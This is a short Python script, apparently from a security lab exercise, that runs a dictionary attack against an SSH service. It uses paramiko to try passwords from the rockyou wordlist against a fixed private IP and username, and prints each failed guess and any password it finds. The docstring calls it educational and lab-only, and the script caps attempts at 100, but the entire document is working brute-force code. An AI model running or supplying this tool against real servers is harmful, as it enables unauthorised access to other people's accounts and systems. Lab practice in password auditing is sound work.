#!/usr/bin/env python3
"""
ssh_dictionary_attack.py
Simple Password Cracker – Phase 2
Dictionary attack against SSH service.
Educational use only – isolated lab environment.
"""

import paramiko
import sys
import time

TARGET_IP   = "192.168.253.152"
TARGET_PORT = 22
USERNAME    = "testuser"
WORDLIST    = "/usr/share/wordlists/rockyou.txt"
MAX_TRIES   = 100  # safety limit for the demo


def ssh_attack(ip, port, username, wordlist, max_tries):
    print(f"[*] Target   : {ip}:{port}")
    print(f"[*] Username : {username}")
    print(f"[*] Wordlist : {wordlist}")
    print(f"[*] Max tries: {max_tries}\n")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            for count, line in enumerate(f, 1):
                if count > max_tries:
                    print(f"\n[-] Reached limit of {max_tries} attempts. Password not found.")
                    return None

                password = line.strip()
                if not password:
                    continue

                try:
                    client.connect(
                        ip,
                        port=port,
                        username=username,
                        password=password,
                        timeout=3,
                        banner_timeout=5,
                        allow_agent=False,
                        look_for_keys=False,
                    )
                    print(f"\n[+] PASSWORD FOUND: '{password}'")
                    print(f"[+] Attempts: {count}")
                    client.close()
                    return password

                except paramiko.AuthenticationException:
                    print(f"    [{count:>4}] Trying: {password:<20} → FAILED")

                except Exception as e:
                    print(f"    [{count:>4}] Error : {e}")
                    time.sleep(1)

    except FileNotFoundError:
        print(f"[-] Wordlist not found: {wordlist}")
        return None


if __name__ == "__main__":
    ssh_attack(TARGET_IP, TARGET_PORT, USERNAME, WORDLIST, MAX_TRIES)
